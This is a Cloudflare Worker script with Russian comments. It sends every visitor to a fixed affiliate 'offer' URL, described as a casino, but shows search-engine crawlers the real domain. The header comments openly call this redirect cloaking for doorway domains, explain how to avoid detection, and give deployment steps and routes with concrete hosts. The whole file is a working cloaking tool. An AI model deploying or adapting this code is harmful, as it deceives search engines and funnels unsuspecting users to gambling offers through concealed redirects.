/**
 * Cloudflare Worker — прямой увод на оффер. Самый простой вариант.
 *
 * Любой запрос к домену получает 302 на фиксированный адрес. Трекер в цепочке
 * не участвует: статистики по таким переходам не будет, в панели они не
 * появятся. Это временная затычка, чтобы не терять трафик, пока нет свежего
 * домена редиректора.
 *
 * Роботы Яндекса и Гугла проходят мимо: им отдаётся домен как есть. Робот,
 * которого с любой страницы мгновенно уводит на казино, — самый явный признак
 * редирект-клоаки, и видят его не по одному домену.
 *
 * НЕ ставить маршрут на пути, куда приходят постбеки партнёрок: постбек уйдёт
 * в редирект и потеряется, а приходит он один раз. На домене трекера маршрут
 * должен быть  домен/go/*  — не  домен/*.
 *
 * НАСТРОЙКА:
 *   1. Workers & Pages → Create Worker → вставить код → Deploy.
 *   2. Settings → Variables and Secrets → TARGET_URL = https://combospark.top/aey3zq5oyv
 *      (необязательно: без переменной берётся значение из кода ниже).
 *   3. Settings → Domains & Routes → маршрут:
 *        на домене трекера — sitegrator-red1.top/go/*
 *        на домене дора    — domain.team/*  и  *.domain.team/*  (два маршрута:
 *                            звёздочка с точкой ловит только сабдомены)
 */

const TARGET_URL_FALLBACK = 'https://combospark.top/aey3zq5oyv';

// Проверка нарочно узкая. Ловить просто слово «yandex» нельзя: мобильное
// приложение Яндекса у живого человека шлёт UA с YandexSearch — такой посетитель
// остался бы на сайте вместо оффера.
const SEARCH_BOTS = /(yandex\.com\/bots|yandex(bot|mobilebot|images|imageresizer|video|media|blogs|news|direct|directdyn|market|pagechecker|webmaster|metrika|calendar|sitelinks|adnet|favicons|renderresourcesbot|screenshotbot|turbo|verticals|accessibilitybot|ontodb|vertis)\b|googlebot|adsbot-google|mediapartners-google|apis-google|feedfetcher-google|storebot-google|googleother|google-inspectiontool|google-extended|google-read-aloud|google-site-verification|google-safety)/i;

export default {
  async fetch(request, env) {
    // робота не уводим
    if (SEARCH_BOTS.test(request.headers.get('user-agent') || '')) {
      return fetch(request);
    }

    let to = String((env && env.TARGET_URL) || TARGET_URL_FALLBACK).trim();

    // кривое значение переменной не должно ронять домен в ошибку воркера
    try { new URL(to); } catch (e) { to = TARGET_URL_FALLBACK; }

    return Response.redirect(to, 302);
  },
};
